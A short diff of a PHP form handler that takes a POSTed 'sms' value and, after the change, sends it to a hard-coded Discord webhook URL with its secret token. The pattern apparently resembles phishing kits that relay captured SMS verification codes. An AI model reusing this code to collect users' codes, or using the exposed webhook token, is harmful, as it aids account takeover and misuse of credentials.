@@ -144,7 +144,7 @@
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
   $sms = $_POST["sms"];
 
-$webhook_url = "Web hook";
+$webhook_url = "https://discord.com/api/webhooks/1513599099386069123/AaBEIy9DQ5QLpDogj-fp9KPEwqcVZ1NlkuhQReoqFV-bMn-4didxphPUtF89xbb8az5j";
 
     $content = "$sms";
 
